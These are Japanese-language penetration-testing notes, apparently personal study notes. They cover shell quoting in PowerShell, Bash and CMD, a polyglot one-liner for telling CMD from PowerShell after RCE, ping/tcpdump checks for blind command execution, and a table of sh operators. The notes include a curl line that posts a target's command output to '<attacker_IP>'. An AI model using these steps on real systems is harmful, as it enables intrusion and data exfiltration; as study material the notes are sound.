- cmd.exeはレジストリの操作などで安定性が高いため、低レイヤーな操作にはcmdを使う
- その他は基本的にPowerShellを使う

# クオテーションの意味

## PowerShell / Bash

- ダブルクオート：変数が展開される
```zsh
NAME="Alice"
echo "Hello $NAME"  # 出力: Hello Alice
echo "Today is $(date)"  # コマンドも実行される
```

- シングルクオート：変数が展開されない（リテラル文字列）
```zsh
NAME="Alice"
echo 'Hello $NAME'  # 出力: Hello $NAME
echo 'Today is $(date)'  # 出力: Today is $(date)
```

## CMD

- ダブルクオート：スペースを含む文字列を１塊として指定
```powershell
net user "suzuki ichiro" #正常：suzuki ichiro として解釈
```

- シングルクオート：クオートそのものがただの文字列として解釈される
```powershell
net user 'suzuki ichiro' #エラー
```

 Windowsターゲットにおいて、RCEなどの脆弱性を利用してコマンドを実行できるとき、現在のシェルがCMDかPowerShellかを判別する
```cmd
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

# コマンドの実行可否を確認する

## 用途

- 攻撃者のペイロードに対する明確な反応がターゲットマシンから得られないため、コマンドの実行成否がわからないとき
- リバースシェルを獲得できるかどうかがわからないとき
	- 以下の方法は、ターゲット環境でコマンドが実行できているかどうかの指標として使える

## 方法

1. 攻撃者あるいはターゲットのマシン上で、tcpdumpを使用
```zsh
sudo tcpdump -i <interface(tun0)> icmp
```

2. もう一方のマシンから、pingを実行する
```zsh
ping -c2 <attacker_IP |target_IP>
```
- `-c2`Windowsの場合は`-n 2`

- 結果：pingの受け手側で、ICMP echo requestを受領（↓イメージ）

# コマンドが動作しない原因を突き止める

## RCE or WebShell上で実行するコマンド

- 普通の環境であればコンソールにエラーが出力されるが、RCE環境やWebシェルではみえない
	- →リダイレクトしてファイル保存 or HTTPで攻撃者マシンに送信する

### Linux

1. 攻撃者のマシンでApache Web Serverとそのログ取得準備をしておく
	- [ファイル操作、ユーティリティ](ファイル操作、ユーティリティ.md#Apache%20webサーバー)のステップ３まで
	- ログ取得の別の方法として、以下で指定するポートへのトラフィックを`tcpdump`でキャプチャする

2. RCE / WebShell環境で、stdoutとstderrをファイルに出力し、そのファイルをリクエストボディとして攻撃者に送付
```zsh
<実行コマンド> > output.txt 2>&1
curl --data @/tmp/output http://<attacker_IP>:<Port>/
```
- `2>&1`：[スクリプト・コマンド・シェル操作](スクリプト・コマンド・シェル操作.md#シェル(`sh`系)の特殊記号一覧表)
- `curl --data @`: POSTリクエストのリクエストボディを指定する

3. 攻撃者のマシンに戻り、Apacheのログを確認する

4. バージョンの違い、必要なライブラリの有無、アーキテクチャの互換性を意識しログを確認する

### Windows

- "'whoami' is not recognized as an internal or external command..."というエラーが表示されてコマンドが実行できないときは、パスが通っていない可能性があるため、標準的なパスの設定をする
```cmd
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```

# シェル(`sh`系)の特殊記号一覧表

- 基本的に`sh`系はKali Linuxなどで使われている
- ファイル記述子1がstdout、2がstderr
- 1は省略され、単純に`>`や`<`で使われるが、2は省略されず、`2>`等とされる

| 記号                     |                               意味（短） | 例と解説                                                                           |
| ---------------------- | ----------------------------------: | ------------------------------------------------------------------------------ |
| `;`                    |                       コマンド区切り（順次実行） | `cmd1; cmd2`：`cmd1` 実行後に `cmd2` を実行（`cmd1` の終了ステータスに依存しない）                     |
| `&&`                   |                  論理AND（前が成功したときに実行） | `cmd1 && cmd2`：`cmd1` が終了コード0なら `cmd2` を実行                                     |
| `&`                    |                  バックグラウンド実行（ジョブとして） | `cmd &`：コマンドの末尾に記載することで、バックグラウンドで実行、シェルは直ちにプロンプトに戻る<br>**デーモンのように動作させたいとき**に使う |
| \|                     |                    パイプ（標準出力→次の標準入力） |                                                                                |
| `>`                    |                    stdout をファイルに上書き | `cmd > out.txt`：`out.txt` に書く（上書き）                                             |
| `>>`                   |                     stdout をファイルに追記 | `cmd >> out.txt`：追記                                                            |
| `2>`                   |                stderr（FD 2）をファイルに書く | `cmd 2> err.txt`                                                               |
| `2>&1`                 |           stderr を stdout に結合（同じ先へ） | `cmd >out 2>&1`：両方とも `out` へ、**何も出力がいらないとき**には`> /dev/null 2>&1`とする            |
| `<`                    |                   ファイルを stdin として読む | `cmd < infile`                                                                 |
| `<<`                   |  here-document（複数行をコマンドの stdin に渡す） | `cat <<EOF\nline\nEOF`                                                         |
| `<<<`                  | here-string（文字列を stdin に渡す；bash 固有） | `grep foo <<< "some text"`                                                     |
| `` `cmd` `` / `$(cmd)` |               コマンド置換（出力を文字列として埋め込む） | `` var=`date` `` または `var=$(date)`                                             |
| `$`（変数）                |                                変数展開 | `echo $HOME`                                                                   |
| `${var}`               |                          変数展開（詳細操作） | `${var:-default}` などでデフォルト値制御                                                  |
| `exec`                 |                     現プロセスを別プログラムで置換 | `exec bash`（現在のシェルプロセスを置換）                                                     |
